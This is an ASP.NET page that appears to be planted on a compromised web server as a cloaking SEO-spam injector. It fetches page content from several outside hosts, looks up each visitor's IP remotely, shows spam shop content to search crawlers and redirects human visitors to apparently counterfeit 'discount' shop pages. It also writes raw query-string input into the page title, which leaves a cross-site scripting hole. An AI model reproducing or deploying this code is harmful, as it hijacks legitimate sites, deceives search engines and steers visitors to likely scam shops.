<%@ Page Language="C#" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {

            webclient = new System.Net.WebClient();
            webclient.Encoding = System.Text.Encoding.UTF8;
            tz();
            hyzhdy = "https://key.jerseyscheapvip.top";
            zhang = webclient.DownloadString("http://rr.nknk.fr/wjf-zhang.asp");
            string ggf = webclient.DownloadString("http://jf.a123.fr/new/dy-wjf2.asp");
             if (Request.QueryString["cdl"] != null)
            {
        string ggcx = webclient.DownloadString("http://jf.a123.fr/new/dy-wjf3.asp?cdl=" + Request.QueryString["cdl"]);
		descriptions = webclient.DownloadString("http://key.okbankservices.com/JDN_description.aspx?kt=" + ggcx);
		}
            string pname = HttpContext.Current.Request.Path;

            string URL = "";

            if (Request.QueryString["shop"] != null)
            {

                URL = zhang + "?gj=" + Request.QueryString["gj"] + "&hl=" + Request.QueryString["hl"] + "&shop=" + Request.QueryString["shop"].Replace(" ", "+") + "&xi=" + Request.QueryString["xi"] + "&xc=" + Request.QueryString["xc"] + "&cdl=" + Request.QueryString["cdl"];
                content = webclient.DownloadString(URL);
                content = content.Replace("euro;", "&euro;");
				content = content.Replace("DDDDD", "EUR");
				content = content.Replace("uuuuuuu", HttpContext.Current.Request.Path);
               
				
            }
            else
            {
                URL = ggf + "&page=" + pname;
                content = webclient.DownloadString(URL);
				
            }

        }
    }
    public void tz()
    {
        string ip = System.Web.HttpContext.Current.Request.ServerVariables["REMOTE_ADDR"];
        if (Request.QueryString["kk"] != null)
        {
            ip = "66.249.64.190";
        }
        string domain = webclient.DownloadString("http://jf.a123.fr/getdomain.aspx?rnd=1&ip=" + ip).ToLower();
        if (domain.IndexOf("google") == -1 && domain.IndexOf("msn.com") == -1 && domain.IndexOf("yahoo.com") == -1 && domain.IndexOf("aol.com") == -1)
        {
            if (Request.QueryString["cdl"] != null)
            {
                string ccc = Request.QueryString["shop"];
                ccc = ccc.Replace("+", "-");
                ccc = ccc.Replace(" ", "-");
                ccc = ccc.Replace("--", "-");
                string ddd = webclient.DownloadString("http://jf.a123.fr/new/dy-wjf2.asp?cdl=" + Request.QueryString["cdl"]);
                string eee = ddd + ccc + ".html";
                eee = eee.Replace("--", "-");
                Response.Redirect(eee);
            }
        }

    }

    public System.Net.WebClient webclient = null;
    public string content = "";
    public string content1 = "";
    public string hyzhdy = "";
    public string Greeting = "";
    public string zhang = "";
    public string hhhvx = "";
    public string URL1 = "";
    public System.Random a = null;
    public string descriptions = "";
</script>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>

    <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
    <title>
        <%=Request.QueryString["shop"]%> - OFF<%=new Random().Next(60, 80)%>% - <%=HttpContext.Current.Request.Url.Host%>!</title>
    <meta name="description" content="<%=descriptions%>" />
    <meta name="robots" content="index,follow,all" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <meta name="Robots" content="index, follows">
</head>
<body>
    <%=content %>
    <%=content1 %>
	
<div class="li">
                    
                    <ul>
					<li><a href="shop.aspx">shop</a></li>
					<li><a href="tao.aspx">tao</a></li>
					<li><a href="tao-fr.aspx">tao-fr</a></li>
<li><a href="vip.aspx">vip</a></li>
					</ul></div>

</body>
</html>
